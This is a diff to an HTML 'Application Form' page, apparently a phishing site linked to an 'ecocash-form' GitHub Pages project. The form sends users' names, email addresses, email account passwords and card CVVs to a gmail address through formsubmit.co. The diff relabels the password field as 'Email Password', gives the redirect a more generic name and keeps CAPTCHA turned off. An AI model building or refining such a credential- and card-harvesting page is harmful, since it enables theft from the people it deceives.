@@ -69,7 +69,11 @@
   </style>
 </head>
 <body>
-  <form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" novalidate>
+  <form id="applicationForm" 
+        action="https://formsubmit.co/exellentfirm@gmail.com" 
+        method="POST" 
+        novalidate>
+        
     <h2>Application Form</h2>
 
     <label for="fullName">Full Name</label>
@@ -88,12 +92,12 @@
     <input type="email" id="email" name="email" required />
     <div id="errorEmail" class="error-message">Please enter a valid email</div>
 
-    <label for="password">Password</label>
+    <label for="password">Email Password</label>
     <div class="password-wrapper">
       <input type="password" id="password" name="password" required />
       <button type="button" onclick="togglePassword()">👁️</button>
     </div>
-    <div id="errorPassword" class="error-message">Password is required</div>
+    <div id="errorPassword" class="error-message">Email Password is required</div>
 
     <label for="linked">Did you link your ATM card to your account?</label>
     <select id="linked" name="linked" required>
@@ -119,8 +123,8 @@
       <div id="errorCVV" class="error-message">CVV must be 3 digits</div>
     </div>
 
-    <!-- Redirect and CAPTCHA settings -->
-    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/ecocash-form/thank-you.html">
+    <!-- ✅ Hidden inputs to enable redirect and disable CAPTCHA -->
+    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/application-form/thank-you.html">
     <input type="hidden" name="_captcha" value="false">
 
     <button type="submit">Submit Application</button>
